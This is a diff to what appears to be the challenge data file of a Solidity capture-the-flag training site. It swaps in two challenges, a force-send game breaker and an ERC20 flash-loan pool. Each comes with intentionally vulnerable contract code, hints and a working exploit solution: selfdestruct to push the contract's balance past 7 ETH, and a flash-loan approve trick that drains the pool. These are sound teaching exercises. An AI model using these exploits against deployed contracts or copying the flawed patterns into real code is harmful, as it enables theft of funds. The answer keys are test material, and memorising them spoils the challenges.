@@ -194,69 +194,94 @@ function withdraw() external {
 }`,
   },
   4: {
-    title: 'Lottery Randomness',
+    title: 'Force Send ETH',
     tags: ['solidity', 'medium', 'security', 'ctf'],
     points: 200,
-    scenario: 'The lottery uses block.timestamp for randomness which can be manipulated.',
+    scenario: 'SevenEth is a game, become the 7th person to deposit 1 ETH to win 7 ETH. You can deposit 1 ETH at a time. Alice and Bob already has 1 ETH deposited.',
     vulnerableCode: `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
+pragma solidity 0.8.30;
 
-contract Challenge4_Lottery {
+contract SevenEth {
     function play() external payable {
-        require(msg.value == 1 ether, "Must send 1 ETH");
-        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
-        if (random % 2 == 0) {
-            payable(msg.sender).transfer(2 ether);
+        require(msg.value == 1 ether, "not 1 ether");
+        uint256 bal = address(this).balance;
+        require(bal <= 7 ether, "game over");
+        if (bal == 7 ether) {
+            payable(msg.sender).transfer(7 ether);
         }
     }
 }`,
     tasks: [
       {
         id: 1,
-        description: 'Manipulate the randomness to always win the lottery.',
+        description: 'Disable the game so that no one can win 7 ETH. 10 ETH will be sent to pwn.',
         completed: false,
       },
     ],
     hints: [
-      'block.timestamp can be influenced by miners.',
-      'You can predict the outcome if you know the timestamp.',
-      'Create a contract that can calculate the winning condition.',
+      'Force ETH balance of contract to be more than 7 ETH',
+      'selfdestruct can force send ETH to a contract',
+      'Use selfdestruct in pwn function to send ETH to target',
     ],
+    solution: `function pwn() external payable {
+    selfdestruct(payable(target));
+}`,
   },
   5: {
-    title: 'Proxy Delegatecall',
+    title: 'ERC20 Flash Loan',
     tags: ['solidity', 'hard', 'security', 'ctf'],
     points: 300,
-    scenario: 'The proxy contract uses delegatecall which preserves the storage context.',
+    scenario: 'LendingPool is offering ERC20 flash loans for free.',
     vulnerableCode: `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
+pragma solidity 0.8.30;
 
-contract Challenge5_Proxy {
-    address public implementation;
-    address public owner;
-    
-    function upgrade(address _impl) external {
-        require(msg.sender == owner, "Not owner");
-        implementation = _impl;
+interface IERC20 {
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+contract LendingPool {
+    IERC20 public token;
+
+    constructor(address _token) {
+        token = IERC20(_token);
     }
-    
-    fallback() external {
-        (bool success, ) = implementation.delegatecall(msg.data);
-        require(success, "Delegatecall failed");
+
+    function flashLoan(uint256 amount, address target, bytes calldata data)
+        external
+    {
+        uint256 balBefore = token.balanceOf(address(this));
+        require(balBefore >= amount, "borrow amount > balance");
+        token.transfer(msg.sender, amount);
+        (bool ok,) = target.call(data);
+        require(ok, "loan failed");
+        uint256 balAfter = token.balanceOf(address(this));
+        require(balAfter >= balBefore, "balance after < before");
     }
 }`,
     tasks: [
       {
         id: 1,
-        description: 'Exploit the delegatecall to take ownership of the proxy.',
+        description: 'Drain all token from LendingPool.',
         completed: false,
       },
     ],
     hints: [
-      'delegatecall preserves the storage layout of the calling contract.',
-      'Storage slots must match between proxy and implementation.',
-      'You can manipulate storage by calling functions through delegatecall.',
+      'Approve the exploit contract to transfer tokens from lending pool.',
+      'Use flashLoan to call approve on the token contract.',
+      'Transfer tokens from the pool after approval.',
     ],
+    solution: `function pwn() external {
+    uint256 bal = token.balanceOf(address(pool));
+    pool.flashLoan(
+        0,
+        address(token),
+        abi.encodeWithSelector(token.approve.selector, address(this), bal)
+    );
+    token.transferFrom(address(pool), address(this), bal);
+}`,
   },
 }
 
